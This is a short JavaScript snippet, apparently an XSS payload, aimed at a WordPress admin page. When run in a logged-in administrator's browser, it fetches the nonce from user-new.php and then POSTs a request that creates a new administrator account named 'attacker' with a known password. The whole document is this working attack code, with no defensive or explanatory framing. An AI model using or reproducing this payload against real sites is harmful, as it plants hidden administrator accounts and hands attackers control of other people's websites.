// Send a GET request to the URL '/wordpress/wp-admin/user-new.php', and extract the current 'nonce' value  
var ajaxRequest = new XMLHttpRequest();  
var requestURL = "/wordpress/wp-admin/user-new.php";  
var nonceRegex = /ser" value="([^"]*?)"/g;  
ajaxRequest.open("GET", requestURL, false);  
ajaxRequest.send();  
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);  
var nonce = nonceMatch[1];  

// Construct a POST query, using the previously extracted 'nonce' value, and create a new user with an arbitrary username / password, as an Administrator  
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@site.com&pass1=attacker&pass2=attacker&role=administrator";  
ajaxRequest = new XMLHttpRequest();  
ajaxRequest.open("POST", requestURL, true);  
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");  
ajaxRequest.send(params);